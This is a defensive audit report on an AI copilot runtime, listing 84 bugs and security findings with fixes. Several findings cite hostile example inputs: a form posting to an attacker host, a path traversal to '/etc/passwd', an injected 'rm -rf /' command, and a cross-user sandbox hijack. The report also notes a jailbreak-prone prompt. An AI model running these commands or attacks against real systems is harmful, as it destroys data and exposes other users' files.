# Studio Copilot Runtime — Deep Behavioral Audit (NEW Findings)

**Date:** 2026-06-23
**Scope:** Agent runtime behaviors — canvas, sandbox, premature-done, streaming, artifacts, lifecycle
**Files audited:** `artifacts/api-server/src/routes/agent.ts`, `artifacts/yt-downloader/src/components/StudioCopilot.tsx`, `artifacts/yt-downloader/src/lib/agent-prompt.ts`

Findings here are NEW — they exclude items already covered in the other `2026-06-23-copilot-*.md` reports (CE1–CE3, H1–H20, known-issues #1–#8).

---

## Totals

| Severity | Count |
|----------|------:|
| Critical | 3 |
| High | 28 |
| Medium | 41 |
| Low | 12 |
| **Total** | **84** |

| Category | Code | Count |
|----------|------|------:|
| Premature done / empty turns | PD | 6 |
| Canvas / code rendering | CR | 13 |
| E2B sandbox lifecycle | SB | 17 |
| Tool sequencing / planning | TS | 13 |
| Streaming UI bugs | SU | 10 |
| Artifact handling | AR | 7 |
| Navigation / tab switching | NV | 3 |
| Lambda async lifecycle | LA | 4 |
| Error / done semantics | ED | 5 |
| System prompt / Gemini config | SP | 7 |
| Cancel / cleanup | CL | 2 |

---

## 1. Premature "done" / empty turns

**[PD-1]** | agent.ts:3675-3686 | High | Empty-response retry loop sleeps `emptyResponseRetries * 800ms` (max 2.4s total). If Gemini returns 4 consecutive empties (transient quota), the agent fires a generic "trouble responding" `text` then `done` even though the user's original task never started. | Differentiate between "model intentionally stopped" and "transient empty" — on the 3rd empty retry, fall back to a single non-streaming `generateContent` call before giving up.

**[PD-2]** | agent.ts:3685, 3702, 3716 | High | When `functionCalls.length === 0` AND `fullText` only contained stripped markers (`[SUGGESTIONS:...]`, `[JUDGE]...`), `fullText.trim() === ""` evaluates true → retries kick in. But `fullText` is the *raw* model text, so a model that emits ONLY `[SUGGESTIONS: "..."]` passes the empty guard and reaches line 3691 with no `functionCalls` → emits empty `text` event + suggestions + `done`. | Compute trimmed `cleanedText = stripReasoningTags(fullText)` and gate empty-response on the cleaned value.

**[PD-3]** | agent.ts:3697-3701 | Medium | If `streamedTextLive === true` (any `canvas_delta` or `text_delta` fired) the final-answer branch skips emitting `text`, but if the only streamed content was a `canvas_start`/`canvas_done` with empty body, the assistant message ends with zero rendered text below the canvas — the UI shows a blank bubble. | Only set `streamedTextLive = true` after emitting non-empty content (not on `canvas_start` alone).

**[PD-4]** | agent.ts:3691-3717 | Medium | "Final answer" path sends `text` event even when `fullText` is purely buffered markers; combined with the pre-event `stripReasoningTags` in `sseEvent`, the `text` event is dropped at line 184 (`if (isTextEvent && !(safePayload).content) return`). Result: only `done` reaches the client → frontend shows blank assistant bubble. | After stripping markers, if the result is empty, route to the same fallback message used for 3-retry-exhausted (line 3683).

**[PD-5]** | agent.ts:3675 | Medium | Empty-output detection uses `fullText.trim() === "" && functionCalls.length === 0`. But `functionCalls` may contain entries with `name === undefined` (note the non-null assertion `name!` at line 3648) when Gemini returns a malformed `functionCall` part. The loop proceeds to execute these and `executeTool` falls through to `default` returning `{ error: "Unknown tool: undefined" }`. | Filter `functionCalls` to drop entries with missing `name` before line 3675.

**[PD-6]** | agent.ts:3577, 3667 | Medium | If the model emits *only* a `<canvas>...</canvas>` block with no text outside, `pendingTextBuf` is empty, `fullText` is non-empty, `functionCalls` is empty → "final answer" branch tries to send `text` (`!streamedTextLive` becomes false). On a too-short canvas (`content.length < 80` per `extractCanvasCandidate`), the client also rejects it. The user sees nothing. | Lower the 80-char canvas threshold or surface a fallback raw text rendering.

---

## 2. Canvas / code rendering bugs

**[CR-1]** | StudioCopilot.tsx:1524 | **Critical** | The canvas preview iframe sets `sandbox="allow-scripts allow-forms"` but does NOT include `allow-same-origin` *omission* protection alone — combined with `srcDoc`, scripts run in a *null* origin but can still navigate the top window, open windows, and access `window.opener`. Worse: scripts can `fetch()` and exfiltrate the user's IP via attacker-controlled HTML the model was tricked into generating. | Add `referrerPolicy="no-referrer"` (already there) plus `allow-popups=false` (already implicit), and add CSP via `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'">` injected into the srcDoc.

**[CR-2]** | StudioCopilot.tsx:1522-1528 | High | iframe sandbox includes `allow-forms` — a model-generated `<form action="https://attacker.com">` POSTs the form data when user clicks. No legitimate canvas use case needs form submission to remote origins. | Remove `allow-forms` from the sandbox attribute.

**[CR-3]** | agent.ts:3505-3507 | High | Bare closing ` ``` ` is converted to `</canvas>` whenever *anywhere* in the buffer `<canvas` is open OR matches `/<canvas\b[^>]*>(?:(?!<\/canvas>)[\s\S])*$/`. If a model writes a `<canvas>` block, then later puts a regular markdown code fence (e.g. for a shell command) BEFORE closing the canvas, the markdown fence becomes a spurious `</canvas>` — corrupting the chat stream. | Track `activeCanvas` state authoritatively; only convert when `activeCanvas !== null`.

**[CR-4]** | agent.ts:3494-3501 | High | Auto-conversion of ` ```html\n` to `<canvas language="html">` triggers on ANY ` ```html` fence — including ones inside a longer `do_full_package` explanation, or a code-review answer that quotes user HTML. The quoted snippet gets promoted to a canvas. | Only auto-promote fences when they begin at column 0 AND the body length exceeds N lines, OR require model to explicitly use canvas tag.

**[CR-5]** | StudioCopilot.tsx:1474, 1534 | Medium | Canvas raw preview uses `<pre className="... whitespace-pre-wrap ... max-h-72 overflow-x-auto">` — `whitespace-pre-wrap` plus `overflow-x-auto` is contradictory: long unbroken tokens (base64, minified JS) won't wrap and will trigger horizontal scroll, which then conflicts with the `max-h-72` vertical clip. On very long lines (>10k chars) Chrome re-layouts cause visible jitter every stream chunk. | Use `overflow-wrap: anywhere` and drop `overflow-x-auto` on the preview pane; or `break-all`.

**[CR-6]** | StudioCopilot.tsx:1456 | Medium | Header subtitle reads `${content.length.toLocaleString()} chars · writing live`. While streaming, this re-renders the parent React subtree every `canvas_delta` (≈ 40 events/sec for a 4 KB canvas), each time recomputing `content.length` and the entire ArtifactShell tree. | Memoize subtitle on `content.length` rounded to 50-char buckets; or debounce.

**[CR-7]** | agent.ts:3486-3487 | Medium | The regex `/` ```` `[a-zA-Z]*\s*\n(\s*<canvas\b)/gi` strips a markdown fence that *wraps* a canvas tag. But if the model emits ` ```html<canvas>` (no newline before `<canvas`) this regex misses it and the literal ` ```html` leaks into the chat. | Make the trailing newline optional.

**[CR-8]** | StudioCopilot.tsx:1057-1083 | Medium | `extractCanvasCandidate` regex `/` ```` `([a-zA-Z0-9+#.-]*)[^\n]*\n([\s\S]*?)` ```` `/g` is non-greedy but allows ` ``` ` *inside* the body when escaped or in nested cases (e.g., a markdown tutorial). The body terminates at the first ` ``` ` regardless. | Use a state-machine parser or require a newline-leading ` ``` ` for the close.

**[CR-9]** | StudioCopilot.tsx:1062-1064 | Medium | `live = true` is set when the OPEN regex matches and content begins with `<!doctype html|<html`. If the model outputs a code fence whose content starts `<!DOCTYPE html` but has NOT closed (stream mid-flight), the candidate is treated as live HTML and rendered in `extractCanvasCandidate` *but* also the streamed text_delta path already routed it through `canvas_delta`. Results in double rendering. | Disable client-side `extractCanvasCandidate` when streaming SSE-routed canvases (the agent already emits `canvas_start`).

**[CR-10]** | StudioCopilot.tsx:1031-1033 | Medium | `isHtmlCanvas` triggers on any text containing `<html` substring — a markdown tutorial about HTML ("the `<html>` element") would be wrapped as a canvas. | Anchor regex to start-of-document or full doctype.

**[CR-11]** | StudioCopilot.tsx:1497-1499 | Low | Header text `live ? "live writing, " : ""` always renders the trailing comma, producing "live writing, preview, copy, download" — minor copy issue.

**[CR-12]** | StudioCopilot.tsx:1462 | Low | "Canvas" button is always visible while `live === true`. Clicking during live-streaming opens the modal with partial content; user can copy the partial-and-being-mutated content, getting truncated paste. | Disable copy/download while `live === true`.

**[CR-13]** | StudioCopilot.tsx:1531 | Low | When `canRenderMarkdown && view === "preview"`, `MarkdownContent` re-runs full markdown parse on every `canvas_delta` (full string, not incremental). For a 50 KB canvas during streaming, this is O(n²). | Throttle re-renders or only render markdown after `canvas_done`.

---

## 3. Sandbox (E2B) lifecycle issues

**[SB-1]** | agent.ts:1202-1203 | **Critical** | `e2bSandboxBySession` and `pendingSandboxCreations` are module-level Maps. Lambda warm-start preserves them across users. The `sessionKey` is `sha256(req.body.sessionId)` — a malicious user can supply a known session ID (e.g., a shared link's session ID or a session ID leaked via referrer) and inherit the previous user's running sandbox with all its files. | Bind sandbox keys to authenticated user identity (cookie auth subject), not just `sessionId`.

**[SB-2]** | agent.ts:1443-1445 | High | `pendingSandboxCreations.delete(sessionKey)` runs in the `finally` of the IIFE — but if the IIFE itself never starts (because `Sandbox.create` throws synchronously before the inner try), the `pending` entry remains forever. Subsequent calls return the rejected promise. | Set the pending entry inside a try and clear it in both an inner finally and an outer catch.

**[SB-3]** | agent.ts:1227-1296 | High | `bootstrapSandboxMediaTools` runs `apt-get update` + `apt-get install` + `pip install` over E2B's 240 s timeout on first use of every new sandbox. If the agent's `getChatSandbox` is called via `runE2BSandboxCommand` from inside a TOOL during an agent run, the user's perceived "Running command..." progress hangs for 1–4 minutes before the actual command even starts. | Run bootstrap asynchronously in background OR show explicit "Preparing sandbox tools..." progress.

**[SB-4]** | agent.ts:1488-1490 | High | `normalizeSandboxPath` only blocks paths not starting with `/` and strips NUL. It does NOT block `/../../etc/passwd` style escapes or symlink targets. Models can write files to `/etc/cron.d/` (E2B runs as `user`, but apt-installed sudo is granted at line 1241-1243 with `command -v sudo`). | Block `..` segments and restrict writes to `/home/user/` and `/tmp/`.

**[SB-5]** | agent.ts:1241-1248 | High | `bootstrapSandboxMediaTools` script uses `sudo apt-get install -y ffmpeg ripgrep` and `sudo apt-get install -y ripgrep`. A model with `run_sandbox_command` can prepend its own `sudo` calls and run privileged shell. | Drop sudo grant; only install user-local binaries.

**[SB-6]** | agent.ts:1287 | High | `sandbox.files.makeDir("/home/user/bin")` runs before the bootstrap command. If `getChatSandbox` is reentrant (race during cold start) two requests both invoke `bootstrapSandboxMediaTools` on the same sandbox concurrently, racing the script and pip installs. | Cache the bootstrap promise per sandbox id, like `pendingSandboxCreations`.

**[SB-7]** | agent.ts:1515-1524 | High | `sandbox.commands.run` does NOT stream `onStdout`/`onStderr` chunks to the client as SSE — `liveOut`/`liveErr` are accumulated in-memory and only delivered after the entire command finishes. For a 2-minute `pip install` the user sees zero progress. | Forward stdout/stderr chunks via `tool_log` SSE events.

**[SB-8]** | agent.ts:1452-1461 | High | `resetChatSandbox` deletes the map entry BEFORE calling `Sandbox.kill`. If kill throws (network blip to E2B), the sandbox keeps running but server lost the handle → orphaned billable sandbox until E2B timeout. | Kill first, then delete.

**[SB-9]** | agent.ts:1512 | High | `commandWithPath = export PATH="..."\n${command}` concatenates raw user/model command. There's no escaping — a model that emits `\nexport PATH=/attacker/bin:$PATH; rm -rf /` injects between the export and command. While sandboxed, this still wastes the sandbox. (Bigger concern: combined with [SB-1] cross-user leakage.) | Use `env -i sh -c "..."` or shellescape the command.

**[SB-10]** | agent.ts:1492-1499 | High | No per-user rate limit on `run_sandbox_command`. A model that loops calling sandbox commands inside `do_full_package` or a multi-iteration plan creates unbounded E2B billing. | Add token-bucket per session.

**[SB-11]** | agent.ts:1499 | Medium | `timeoutMs` clamped to `10 * 60 * 1000` (10 min). Lambda function URL has a 15-min total ceiling. A single sandbox command can consume 67% of the Lambda's budget. | Cap to 3 minutes for default tier.

**[SB-12]** | agent.ts:1502-1508 | Medium | `writeFiles` capped at 12 files but each can be `E2B_MAX_FILE_CHARS = 120000` chars. 12 × 120 KB = 1.4 MB streamed through Lambda per call, repeated each tool invocation. No cumulative limit. | Add overall write size cap.

**[SB-13]** | agent.ts:1505 | Medium | `String(file?.content ?? "")` doesn't validate file content is UTF-8. Models that try to write binary content (returned base64 from another tool) get corrupted files. | Add a `contentEncoding: "base64"` option.

**[SB-14]** | agent.ts:1531-1535 | Medium | `sandbox.files.read(path, { format: "text" })` — reading a binary file in text mode silently returns garbage; the tool reports the corrupt content to the model which then hallucinates about it. | Detect binary via magic bytes / content-type and refuse text-mode read.

**[SB-15]** | agent.ts:1207-1209 | Low | `pruneExpiredSandboxEntries` runs only at the start of `getChatSandbox`. If the agent never gets a request, expired entries pile up. | Schedule periodic interval prune.

**[SB-16]** | agent.ts:1418-1419 | Low | `Sandbox.connect(existing.sandboxId, { timeoutMs: E2B_SANDBOX_TIMEOUT_MS })` resets timeout to 1 hour on every connect. A user who keeps a stale chat tab open for hours can keep the sandbox alive indefinitely (and pay for it). | Cap total session sandbox lifetime to 4 hours.

**[SB-17]** | agent.ts:1287, 1500 | Low | `sandbox.files.makeDir(...).catch(() => {})` swallows errors silently. If the sandbox is read-only (E2B service issue) the subsequent writes also fail but the user gets a confusing "command failed" later. | Surface a clear "sandbox unwritable" error.

---

## 4. Tool-call sequencing / planning

**[TS-1]** | agent.ts:3720-3725, 3727 | High | `plan` event is emitted BEFORE the first `tool_start` (good), but the `runToolCall` function emits `tool_start` from within `Promise.all` — for parallel batches, tool_starts may interleave OUT OF ORDER relative to the plan list. Frontend's plan-vs-card matching breaks. | Pre-emit `tool_start` events synchronously before kicking off `Promise.all`.

**[TS-2]** | agent.ts:2517-2524 | High | `do_full_package`'s internal `runStep` calls `executeTool` recursively passing the SAME `toolId` (line 2519). Every sub-tool emits `tool_start`/`tool_done` with that *outer* toolId, so the frontend matches all sub-tool events to the outer `do_full_package` card. Sub-tool progress is invisible to the user. | Generate a fresh toolId per sub-step or skip emitting sub-tool_start.

**[TS-3]** | agent.ts:2519 | High | Sub-tool failures throw inside `runStep`, which is wrapped in `Promise.allSettled` (good). But sub-tool SSE events fired before the throw remain in the stream — frontend shows them as still "running" because no `tool_done` is sent on throw. | In the `tool_done` emit at line 3767, also fire on `runStep` reject path.

**[TS-4]** | agent.ts:3777-3796 | Medium | The grouping loop `while (fcIndex < functionCalls.length && batch.length < limit && getToolParallelGroup(...) === group)` greedily fills a batch with same-group calls. If a model returns `[light, light, serial, light]`, the third `light` is held back behind a serial call and only runs after — the model's intended parallelism is broken. Not necessarily wrong, but contradicts the spec. | Document and ensure model is aware, or reorder.

**[TS-5]** | agent.ts:3742 | Medium | Each parallel `runToolCall` mutates the shared `res` SSE stream — frames from concurrent tools interleave. `sseEvent` is synchronous per call but two Promise.all entries can write tool_start frames in arbitrary order. The `index` field on tool_log/tool_progress events refers to `toolId` but the `tool_log` ordering between tools is non-deterministic. | OK as long as toolId disambiguates; verify frontend handles arbitrary interleave.

**[TS-6]** | agent.ts:3756, 3767 | Medium | `tool_done` fires even when tool threw mid-stream (line 3760-3765). But `pollJobUntilDone` may have ALREADY fired `tool_progress` with `status: "error"` (line 230). Frontend sees: error progress → late tool_done → status flips to "done"-color. | After catch, suppress further tool_done OR mark status before done event.

**[TS-7]** | agent.ts:3748-3749 | Medium | Two SSE events fired back-to-back (`tool_start` then `tool_log`), both with same `toolId`. The frontend handler at StudioCopilot:3079-3088 matches `tool_log` to existing tool_start by toolId — but if the `tool_start` patch hasn't applied yet (React state batching), `m.parts.findIndex` returns -1 and the log is dropped. | Defer first `tool_log` to next tick OR include initial message in the tool_start event.

**[TS-8]** | agent.ts:3811-3817 | Medium | `[JUDGE] Tools failed: ...` is pushed as `{text: ...}` into `orderedToolResults` (sent back as user-role parts). The model sees this as a tool result. But the model's history now alternates `model → user(toolResults + judgeText)` — Gemini's expected pattern is `model → user(functionResponse only)`. Mixing text into the function-response turn causes Gemini occasional 400 INVALID_ARGUMENT. | Send judge text as a separate user turn.

**[TS-9]** | agent.ts:3822-3830 | Medium | `loopContents` grows unbounded across iterations. With `MAX_ITERATIONS=60`, a long agent run accumulates 60 (model+user) pairs plus all original messages — easily 200+ K tokens. Gemini will start returning truncated responses or 400s. | Compress old iterations after iteration 10.

**[TS-10]** | agent.ts:3724 | Medium | Plan event sends `fc.args` raw. For tool calls with `inlineData` images (e.g., `enhance_image`), this would dump base64 in the plan event. Currently image attachments aren't in args, but `read_uploaded_file` task args could be huge. | Truncate args in plan event.

**[TS-11]** | agent.ts:3768 | Medium | `if (toolArtifact) sseEvent(res, { type: "artifact", runId, toolId, ...(toolArtifact as object) });` fires AFTER `tool_done`. Frontend's `artifact` handler creates a new artifact part appended to `m.parts` — the order is tool_card then artifact card, fine. But if the artifact handler decides it's "informational" (text/workspace) it tries to patch the matching tool_start by toolId — that already exists, so it gets merged correctly. However if `tool_done` set `done: true`, the inlineArtifact patch is still applied. OK. But for two tools of the same name running in parallel, the second tool's artifact may attach to the first's tool card due to fallback logic at line 3183. | Always send `toolId` in artifact event (already done) and require exact match only.

**[TS-12]** | agent.ts:3742-3775 | Medium | Tool args from `fc.args` are passed by reference to `executeTool`, which may mutate them (e.g., `args.quality ?? "best"`). If the model retries the same call with the same `fc` object, the in-memory args are now mutated. | Spread `{ ...fc.args }` when forwarding.

**[TS-13]** | agent.ts:3777 | Low | The `for` loop checks `isConnected()` in the condition but the gap between `Promise.all` resolution and the next condition check leaks (already noted in prior reports for serial — here it's the parallel path).

---

## 5. Streaming UI bugs

**[SU-1]** | StudioCopilot.tsx:2982 | High | `appendText` merges into the last text part if its kind is "text". If a `tool_done` causes a tool_card part to be appended between two text deltas (model emitted text → tool → more text), the second batch of text deltas starts a new text part — fine. But if `cleanAssistantText` strips a delta to empty (line 2976 → 2978 `if (!cleaned) return;`), the delta is silently dropped including any whitespace it carried. A model that streams `" "` between two URLs gets `URLA URLB` concatenated to `URLAURLB`. | Pass through whitespace-only deltas (the agent already protected against this server-side but the client undoes it).

**[SU-2]** | StudioCopilot.tsx:2962-2967 | High | `cleanAssistantText` regex `/\[?\/api\/(?:youtube\/file|...)\/[^\]\s)]+(?:\]\(\/api\/...\))?/g` strips API-path URLs from text. A model that quotes `` `/api/youtube/file/abc.mp4` `` in an explanation gets it replaced with "the button above" — but if no button exists in this message, the phrase is confusing. | Only replace when an artifact part actually exists in the message.

**[SU-3]** | StudioCopilot.tsx:3054 | Medium | `setActiveToolLabel(null)` runs on EVERY `text` event, including streaming `text_delta`. If a tool is mid-execution and emits `tool_progress` while text deltas also flow (impossible in current code but possible if model streams text concurrent with tool), the active tool label gets cleared. | Only clear on `text` (final), not `text_delta`.

**[SU-4]** | agent.ts:3537-3538 | Medium | `canvasRouteBuf.slice(closeIdx + closeTag.length)` then `continue` — but the loop restarts at line 3510 and may encounter another `<canvas` immediately. No bound on nested/sequential canvases per chunk. A model that emits 50 small canvases creates 50 separate artifact cards. | Cap canvases per assistant message.

**[SU-5]** | agent.ts:3554, 3548 | Medium | `text_delta` events fire while inside `emitCanvasRoutedText` for every "before" chunk + leftover text. If `pendingTextBuf` contains 50 KB of text from a single Gemini chunk, `sseEvent` writes the whole thing as ONE `text_delta` — frontend's `appendText` reflows the entire bubble at once causing jank. | Chunk huge deltas to ~2 KB.

**[SU-6]** | StudioCopilot.tsx:3346-3350 | Medium | Buffer split by `/\r?\n\r?\n/` accumulates `buf` unboundedly until a double-newline lands. If a Gemini chunk contains a 1 MB partial SSE frame, the buffer grows accordingly. | Cap buffer at 4 MB or fail safely.

**[SU-7]** | StudioCopilot.tsx:3354 | Medium | `parseSseFrame(buf, true)` on trailing buffer always passes the trailing buffer even when it's empty. The "Note: response stream ended with partial update" message at 3013-3020 fires whenever the stream ends WITHOUT a `done` event AND the trailing buffer is non-empty AND fails to parse. But it also fires on legitimate aborts — the user clicked Stop, server closed, trailing buf has half a frame → user sees the "looks missing" note. | Suppress when abort came from user.

**[SU-8]** | agent.ts:3589 | Medium | `thought_delta` events stream `tp.text` raw — includes the model's "thinking" tokens that may contain quoted user data, API keys mentioned in tool args, or unsanitized strings. Frontend shows these in a thoughts panel verbatim. | Run thoughts through `stripReasoningTags`.

**[SU-9]** | StudioCopilot.tsx:3041-3052 | Low | `thought_delta` accumulator computes `boldMatches = updated.match(/\*\*([^*]+)\*\*/g)` on the entire growing string every chunk. For a 50 KB thoughts trace this is O(n²). | Cap thought text length or only check the last 1 KB.

**[SU-10]** | agent.ts:3604-3621 | Medium | Marker hold-back logic iterates `markerPatterns × 1..pat.length` per text chunk. For a chunk of 10 KB this is fast, but the `lastIndexOf` scans every byte. More critically, `holdIdx === -1 || idx < holdIdx` keeps the EARLIEST hold position — so if `[Tool:` appears near the start and `[Artifact:` appears later, we hold from `[Tool:`. Text between them never emits. | OK semantically; ensure final flush at 3654 sanitizes leftovers (it does via the regex set).

---

## 6. Artifact handling

**[AR-1]** | agent.ts:3768 | High | Artifact event spread `...toolArtifact` puts `artifactType`, etc., at top level but if `toolArtifact` is the typed return shape, no validation ensures `artifactType` is in the closed set `{text, download, image, audio, tab_link, workspace_*}`. A custom tool that returns `artifactType: "unknown"` is rendered as nothing by the frontend (silent drop). | Validate artifactType against an allowlist.

**[AR-2]** | agent.ts:2086, 2118 | Medium | `downloadUrl: /api/youtube/file/${jobId}` is a relative URL. When the agent runs behind a different host (preview deploys) the artifact card constructs a link to the wrong origin. The frontend assumes same-origin. | Always emit absolute URLs or document the contract.

**[AR-3]** | agent.ts:2161-2163 | Medium | `find_best_clips` artifact uses `tab_link` with `jobId`, but jobId is the BACKEND job ID — when user clicks the tab link, the frontend's `BestClips` tab needs to fetch that job. If the agent ran in another browser tab/session, the local activity feed has no record. | Persist jobId server-side keyed by user so the tab can rehydrate.

**[AR-4]** | StudioCopilot.tsx:3256 | Medium | Artifact registration assumes `evt.canvasId` is unique. For two `canvas_start`s with the same `canvasId` (server bug or replay) the second is dropped silently at line 3276. | OK, but log to console.

**[AR-5]** | agent.ts:2645-2652 | Medium | `create_image` returns `imageUrl: image.imageUrl, downloadUrl: image.imageUrl` (same URL for both). The image URL is a presigned S3 URL that expires (typically 2 h). The frontend artifact card displays the image forever — after URL expiry, image breaks silently. | Re-presign on display or use a CDN proxy URL.

**[AR-6]** | agent.ts:2802-2812 | Medium | `generate_music` artifact includes `audioUrl` (presigned) used directly as `<audio src>`. Same 2 h expiry — pinned music in the user's history breaks. | Use the `/agent/music-share` endpoint instead.

**[AR-7]** | agent.ts:2519, 2521 | Low | `do_full_package` deliberately suppresses sub-tool artifacts in the comment "Sub-artifacts are intentionally not re-emitted". The user therefore cannot click any download produced by phase 2. | Re-emit important artifacts (download, image, audio) — only suppress text/workspace.

---

## 7. Navigation / tab switching

**[NV-1]** | agent.ts:2300, 2627 | High | `translate_video` AUTO-emits `navigate` to "translator" tab while the user might be reading a result. If the user typed "translate this and also make a clip", the auto-navigate fires before the clip artifact renders, possibly cutting off scroll. | Make navigate optional, set by model intent.

**[NV-2]** | agent.ts:413-425, 2249-2251 | High | `navigate_to_tab` accepts arbitrary `args.tab` string. No validation against the Mode union (`home|copilot|download|clips|...`). A typo like `"translater"` emits `navigate` event; frontend `onNavigate(evt.tab)` is called — if the parent doesn't handle invalid tabs, the URL state diverges from UI. | Validate against allowlist server-side.

**[NV-3]** | StudioCopilot.tsx:3226 | Low | `if (onNavigate) onNavigate(evt.tab); return;` — but `navigate` events arrive interleaved with `text_delta`. If `navigate` fires mid-stream, the user is yanked away from the chat WHILE the assistant is still streaming a response. | Defer navigate until `done`.

---

## 8. Lambda / async lifecycle

**[LA-1]** | agent.ts:2778-2780 | High | `setInterval(musicProgress, 10_000)` is cleared in `try`/`catch`, but if the request aborts during `Promise.allSettled`, the catch path at 2797-2800 calls `clearInterval(musicProgress)` — correct. But if Lambda freezes mid-Promise.allSettled (e.g., user-initiated abort triggering `res.end`), the interval may continue firing for one tick before freeze, calling `sseEvent` on a closed connection. Guarded but wasteful. | Tie interval to `isConnected()` and abort.

**[LA-2]** | agent.ts:3870-3872 | High | `void cancelAgentRunJobs(...)` returns a Promise we never await. Then `res.end()` runs and Lambda freezes between those two lines on a tight execution budget. Job cancel HTTPS calls may never reach the internal API. | `await cancelAgentRunJobs` when client disconnected.

**[LA-3]** | agent.ts:3364-3366 | Medium | Heartbeat interval fires `if (clientConnected) sseEvent`. `clientConnected` is closed-over from line 3353. The `res.on("close")` callback flips it, but if the close handler runs AFTER an interval tick already started, that tick writes to the closed socket — guarded by `res.writableEnded` check in `sseEvent`. Defense-in-depth OK.

**[LA-4]** | agent.ts:3261-3264 | Medium | `await ensureVertexCredentials()` runs on every request even after first success. If credentials are valid in cache, this is a no-op. But if S3 hiccups, the request 503s even though credentials are already in memory. | Memoize at module scope; only re-fetch on auth error.

---

## 9. Error / done semantics

**[ED-1]** | agent.ts:3845-3866 | High | The error handler `if (isConnected())` emits `error` event. Frontend listener at StudioCopilot:3317-3328 inserts an "Error: ..." text part into the assistant message. But it does NOT set any "done" state on tool cards still showing "Running...". | On `error`, also mark all unfinished tools as cancelled (Stop button does it; error path doesn't).

**[ED-2]** | agent.ts:3849-3851 | Medium | Empty-output Gemini error path emits `text` then immediately `done` and `return`. The `finally` block STILL runs `cancelAgentRunJobs` because `runCompleted` was set to true before return. Wait — `runCompleted = true` is set at line 3851 BEFORE return, so finally sees `runCompleted=true` and skips cancel. OK. But heartbeat interval also still active in finally. Clear is at 3868 — fine.

**[ED-3]** | StudioCopilot.tsx:3329 | Medium | `if (evt.type === "done") { setThinking(false); ...}` does NOT `return` after handling, so execution falls through to the next `if`. Currently next is `if (evt.type === "suggestions")` which won't match. But if a future handler is added without `return` between, subtle bug surface. | Add `return` after done.

**[ED-4]** | agent.ts:3836-3838 | Medium | MAX_ITERATIONS exit emits a friendly note as `text` event but NOT a `done`. The `done` is emitted at 3842 conditionally on `isConnected()`. If client just disconnected, no done; if connected, done fires. OK. But the friendly note also doesn't carry `runId`. Frontend may show stale runs.

**[ED-5]** | agent.ts:3675-3686 | Medium | Three retries on empty response are sleep `800ms, 1600ms, 2400ms` (4.8s total). Meanwhile, the heartbeat interval is the only thing keeping the SSE connection alive — and during these `await new Promise(r => setTimeout(r, ...))` the loop yields to event loop and heartbeats fire. Good. But CloudFront `/api*` `OriginReadTimeout: 60` — if Gemini hangs for >60s the connection is killed by CloudFront before retry can fire. | Reduce maxOutputTokens or increase ORT.

---

## 10. System-prompt / Gemini config

**[SP-1]** | agent.ts:26-28 | High | Default models `gemini-3.5-flash`, `gemini-3.1-pro-preview`, `gemini-3.5-flash` — but the public Gemini API model namespace is `gemini-2.5-flash` and `gemini-3-pro-preview` (etc.). `gemini-3.5-flash` does not exist as of writing. `createGeminiClient().models.generateContentStream({ model: "gemini-3.5-flash" })` will 404. Hidden by `try { await ensureVertexCredentials() } catch {}` — if Vertex is configured with different model availability the issue surfaces only in prod. | Verify model IDs against current Gemini catalog.

**[SP-2]** | agent.ts:36-37 | Medium | `MAX_ITERATIONS=60` and `AGENT_MAX_OUTPUT_TOKENS=16384`. CLAUDE.md documents 24 iterations and Flash supports ~8K out. Drift between code defaults and CLAUDE.md is a maintenance hazard. | Reconcile.

**[SP-3]** | agent.ts:3429 | Medium | `toolConfig: { functionCallingConfig: { mode: "AUTO" as any } }` — `as any` bypasses type-check. If the SDK rejects AUTO at runtime (it doesn't, but contract drift), this fails silently. | Use enum.

**[SP-4]** | agent.ts:3431-3434 | Medium | `thinkingLevel: "HIGH" as any` and `includeThoughts: true` — sending thoughts back on every iteration costs tokens and adds latency, but the loop history also includes them via `rawFcParts` (lines 3649). Multi-iteration thoughts compound exponentially. | Strip thought parts from history before next iteration.

**[SP-5]** | agent-prompt.ts:1-2 | Medium | `keyToUse = apiKey || "vms_live_YOUR_KEY"` — but the function is never called with a real key in this codebase (it builds developer documentation, not the agent system prompt). The "vms_live_YOUR_KEY" placeholder leaks into shown docs. Verified the actual `SYSTEM_PROMPT` is at agent.ts:886. | This is dead/orphan code or used elsewhere — confirm and either remove `agent-prompt.ts` or pass real key.

**[SP-6]** | agent.ts:1033 (SYSTEM_PROMPT) | Low | The "MANDATORY"/"FORBIDDEN" all-caps directive for `generate_music` ("you MUST call this tool, never describe...") is a strong jailbreak attractor — adversarial users can phrase requests so the model overrides safety guidance for unrelated topics. | Soften wording.

**[SP-7]** | agent.ts:3342 | Low | Model fallback `requestedModel && requestedModel !== "default" && ... && ALLOWED_MODELS.has(requestedModel)` — only `gemini-3.5-flash` and `gemini-3.1-pro-preview` are allowed (lines 29-32), so any explicit request for, e.g., a newer model is silently downgraded. Users see no error. | Reject unknown explicit models with a clear error.

---

## 11. Cancel / cleanup

**[CL-1]** | agent.ts:121-129 | High | `cancelAgentRunJobs` iterates the 3 cancel endpoints sequentially per job and breaks at first 200. Total worst-case time = 3 endpoints × N jobs × ~200 ms. Wrapped in `Promise.allSettled` over jobs (good), but the sequential endpoint iteration inside each job is wasted time during a Lambda freeze. | Race the 3 endpoints in parallel; first 200 wins.

**[CL-2]** | agent.ts:3869-3870 | Medium | `if (!runCompleted) void cancelAgentRunJobs(...)` — if the run completed but during `res.end()` the client had already aborted, jobs that ran in the background (e.g., GPU translate) keep running. | Track GPU-style "fire and forget" jobs separately.

---

## Hot Zones — Fix First

1. **[SB-1]** — Cross-user sandbox file leak via Lambda warm start
2. **[CR-1] / [CR-2]** — Canvas iframe scripts can `fetch()` (CSP missing) and `allow-forms` permits remote POST
3. **[SP-1]** — Model IDs `gemini-3.5-flash` / `gemini-3.1-pro-preview` likely 404 in public API
4. **[PD-2] / [PD-4]** — Marker-only model outputs produce blank assistant bubbles
5. **[TS-2] / [TS-3]** — `do_full_package` sub-tool progress invisible; sub-tool throws leave "Running..." forever
6. **[LA-2]** — `void cancelAgentRunJobs` not awaited before `res.end()` → Lambda freeze may drop cancellations
7. **[NV-1] / [NV-2]** — Auto-navigate yanks user mid-stream; tab name not validated
8. **[CR-3] / [CR-4]** — Greedy canvas regex corrupts streams containing normal code fences

---

*Generated 2026-06-23 by deep behavioral audit subagent — VideoMaking Studio Copilot Runtime*
